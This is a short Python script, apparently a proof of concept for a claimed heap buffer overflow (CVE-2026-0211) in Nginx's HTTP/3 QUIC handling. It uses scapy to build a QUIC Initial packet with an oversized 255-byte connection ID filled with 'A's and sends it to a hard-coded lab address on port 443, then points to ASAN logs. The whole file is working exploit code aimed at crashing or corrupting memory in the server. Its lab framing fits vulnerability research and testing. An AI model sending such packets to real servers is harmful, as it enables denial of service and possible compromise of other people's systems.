#!/usr/bin/env python3
import time
import struct
import random
from scapy.all import IP, UDP, Raw, send

TARGET_IP = "10.13.37.10"
TARGET_PORT = 443

def generate_malformed_quic():
    """
    Simulates CVE-2026-0211 by crafting a QUIC Initial Packet 
    with a malformed Destination Connection ID (DCID) length.
    """
    # Header Form = 1 (Long Header), Fixed Bit = 1, Packet Type = 00 (Initial)
    # 1100 0000 = 0xc0. We use 0xc3 to include some standard reserved/packet number bits.
    flags = b'\xc3'
    
    # Version 1 (RFC 9000)
    version = struct.pack("!I", 1) 
    
    # --- MALFORMED ATTRIBUTE ---
    # Vulnerability hypothesis: No bounds checking on dcid_len before memcpy
    dcid_len = b'\xff' # 255 bytes (Max valid is typically 20 in normal implementations)
    
    # Payload to overflow the heap chunk allocated for CID (e.g., 20 bytes)
    # 255 bytes of 'A' will overwrite adjacent heap metadata/data.
    dcid_data = b'A' * 255
    
    # Normal Source Connection ID (SCID)
    scid_len = b'\x08'
    scid_data = b'B' * 8
    
    # Dummy Token Length (0) and Payload Length (0)
    # The parser will crash while reading DCID, so we don't need a full valid payload.
    token_len = b'\x00'
    length = b'\x00'
    
    payload = flags + version + dcid_len + dcid_data + scid_len + scid_data + token_len + length
    return payload

def main():
    print(f"[*] Starting QUIC Fuzzer against {TARGET_IP}:{TARGET_PORT}")
    print("[*] Simulating CVE-2026-0211: Nginx HTTP/3 QUIC Heap Buffer Overflow")
    
    payload = generate_malformed_quic()
    
    print(f"[*] Payload generated. Size: {len(payload)} bytes.")
    print(f"[*] DCID Length is intentionally malformed to 255 (0xFF).")
    print("[*] Sending malformed packet...")
    
    packet = IP(dst=TARGET_IP)/UDP(sport=random.randint(1024, 65535), dport=TARGET_PORT)/Raw(load=payload)
    send(packet, verbose=False)
    
    print("[+] Packet sent! Check 'target_nginx' ASAN logs for memory corruption detection.")

if __name__ == "__main__":
    main()
